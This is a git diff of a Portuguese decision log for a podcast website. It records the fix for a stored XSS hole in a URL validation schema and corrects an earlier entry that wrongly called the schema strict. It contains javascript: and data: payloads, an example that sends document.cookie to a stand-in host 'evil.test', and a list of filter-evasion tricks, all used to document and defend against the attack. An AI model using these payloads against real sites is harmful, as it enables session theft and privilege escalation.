@@ -111,7 +111,9 @@
 
 ## DEC-014: `imageRefSchema` aceita URL absoluta ou path root-relativo
 **Contexto:** A revisão independente da onda 0 encontrou um bloqueador: os dois "contratos estabilizados" da onda se contradizem. O seed (TCK-002) grava `coverImage: "/images/podcasts/horizonte-digital-cover.jpg"`, enquanto `urlSchema = z.string().url()` (TCK-003) exige URL absoluta. `podcastCreateSchema.safeParse()` rejeita os 5 programas do seed, todo `hosts[].photo`, os `thumbnail` de episódio, `logoUrl`/`faviconUrl` e os 3 `avatarUrl`. Na prática o admin (TCK-018) abriria qualquer programa vindo do seed, clicaria em salvar e receberia 422 `Invalid url`.
-**Decisão:** Introduzir `imageRefSchema`, que aceita **URL absoluta `http(s)` ou path começando com `/`**, rejeitando `//`, `javascript:`, path traversal e string vazia. Aplicado a todos os campos de imagem. `urlSchema` permanece estrito para links de fato externos (`socialLinks`, `youtubeUrl`, `spotifyUrl`). O seed mantém os paths relativos.
+**Decisão:** Introduzir `imageRefSchema`, que aceita **URL absoluta `http(s)` ou path começando com `/`**, rejeitando `//`, `javascript:`, path traversal e string vazia. Aplicado a todos os campos de imagem. `urlSchema` continua sendo o schema dos links de fato externos (`socialLinks`, `youtubeUrl`, `spotifyUrl`). O seed mantém os paths relativos.
+
+> **CORREÇÃO (DEC-022):** a redação original desta decisão dizia que "`urlSchema` permanece **estrito**" para links externos. **Isso era falso.** `urlSchema` era `z.string().url()`, que valida sintaxe de URI e **não** protocolo: `javascript:alert(1)` passava. Essa premissa errada, escrita aqui, é o que fez o buraco atravessar três revisões — os revisores liam a decisão e assumiam a garantia. A allowlist de protocolo só passou a existir na DEC-022. Nenhuma afirmação de garantia de segurança deve ser registrada neste arquivo sem um teste que a demonstre.
 **Justificativa:** as duas formas são legítimas no produto — upload real vai para o Supabase Storage e produz URL absoluta; assets de demonstração ficam em `public/` e são referenciados por path root-relativo. Forçar uma só das pontas quebraria o outro caso de uso.
 **Alternativas:** (a) Seed usar URLs absolutas de CDN — rejeitado: inventa um host que não existe e torna o seed dependente de infraestrutura externa para rodar localmente; (b) afrouxar para `z.string()` — rejeitado: perde a validação inteira e abre `javascript:` em atributo de imagem.
 **Consequências:** TCK-002 ganha um teste que valida as estruturas do seed contra os schemas Zod reais, para a contradição não voltar.
@@ -179,3 +181,27 @@ O que separa o certo do errado é propagação de constantes interprocedural com
 **Consequências:** Atribuído a TCK-024 (deploy, CI e monitoramento), que já tem escopo de endurecimento. Ao padronizar, a regra "toda operação com `requestBody` declara 413" passa a valer e deve virar teste em `contract-validation.test.ts`.
 **Status:** Aprovado como dívida atribuída.
 **Tickets:** TCK-005, TCK-006, TCK-024.
+
+## DEC-022: allowlist de protocolo em `urlSchema` — correção de XSS armazenado
+**Contexto:** A revisão independente da onda 2 encontrou XSS armazenado com escalação de privilégio, originado em `src/lib/schemas.ts`. `urlSchema` era `z.string().url()`, e `z.string().url()` valida **sintaxe de URI, não protocolo** — `javascript:alert(1)` é URI sintaticamente válida. Reproduzido:
+
+```
+urlSchema.safeParse('javascript:alert(1)')                       -> success: true
+urlSchema.safeParse('data:text/html,<script>alert(1)</script>')  -> success: true
+```
+
+**Cadeia de ataque:** (1) um EDITOR autenticado faz `POST`/`PATCH /api/podcasts` com `socialLinks: {instagram: "javascript:fetch('https://evil.test/'+document.cookie)"}` e o schema aceita; (2) `/portfolio/[slug]` renderiza `href="javascript:..."` no HTML SSR; (3) qualquer visitante que clique em "Instagram" executa script na origem do site — **inclusive um ADMIN**, o que torna isto uma escalação EDITOR → ADMIN. A CSP planejada em `docs/SECURITY.md` (`script-src 'self' 'unsafe-inline'`) **não** bloqueia `javascript:` em `href`. O `data:` passa pelo schema mas o browser bloqueia a navegação top-level; o vetor vivo é o `javascript:`.
+
+**Decisão:** `urlSchema` passa a exigir **allowlist de protocolo: só `http:` e `https:`**, verificada com o parser WHATWG (`new URL`) e o campo `protocol` — **nunca** com regex sobre a string crua. O parser é justamente quem decide o que o browser vai executar, e já normaliza as evasões clássicas antes de expor `protocol`: remove tab/LF/CR internos (`java\tscript:` → `javascript:`), remove espaços e controles nas pontas (` javascript:` → `javascript:`) e normaliza o esquema para minúsculas (`JAVASCRIPT:` → `javascript:`). Credenciais embutidas (`https://user:senha@host`) também são recusadas: nenhum link legítimo de rede social as usa e elas servem para disfarçar o host real.
+
+**Alternativas:** (a) Regex de blocklist sobre a string crua (`/^javascript:/i`) — **rejeitado**: blocklist sobre string não normalizada é exatamente o que as evasões por tab, newline, null byte e maiúsculas derrotam; (b) confiar só na sanitização na renderização (TCK-016) — **rejeitado como solução única**: mantém dado hostil no banco, e qualquer consumidor futuro (feed, export, e-mail, app) reintroduz o vetor. Vale como a segunda camada, não como a única.
+
+**Consequências:**
+- `imageRefSchema` foi auditado no mesmo passe (item 4 da correção). O ramo absoluto já estava preso a `http(s)` por construção — o regex exige literalmente `http://` ou `https://` no início e proíbe espaço/tab/quebra —, então nenhuma das 23 evasões passava. A auditoria encontrou um caso menor que passava, `https://user:senha@evil.test/`, fechado proibindo `@` na **autoridade** (o caminho continua aceitando `@`, ex. `/images/@2x/logo.png`). Como o `pattern` publicado no OpenAPI é o `.source` desse regex (DEC do contrato), os YAMLs foram republicados e o teste de igualdade byte a byte garantiu a sincronia.
+- `youtubeUrl`/`spotifyUrl` derivam de `urlSchema` e, além disso, já exigem `^https?://` nos padrões canônicos; ficam cobertos pelas duas pontas.
+- Corpus de evasão de 23 entradas virou teste permanente em `tests/unit/schemas.test.ts`, aplicado a `urlSchema` **e** a `imageRefSchema`, mais a cadeia de ataque ponta a ponta (`podcastCreateSchema` / `podcastUpdateSchema` / `socialLinksSchema`). Se alguém reintroduzir `z.string().url()` cru, a suíte fica vermelha.
+- Defesa em profundidade: TCK-016 sanitiza na renderização (`toSafeExternalUrl` em `social-links.tsx`). Sanitizar na escrita **e** na renderização é a decisão; nenhuma das duas camadas sozinha é suficiente.
+- A DEC-014 foi corrigida acima, porque afirmava uma garantia que não existia.
+
+**Status:** Aprovado.
+**Tickets:** TCK-003 (camada de escrita), TCK-016 (camada de renderização).
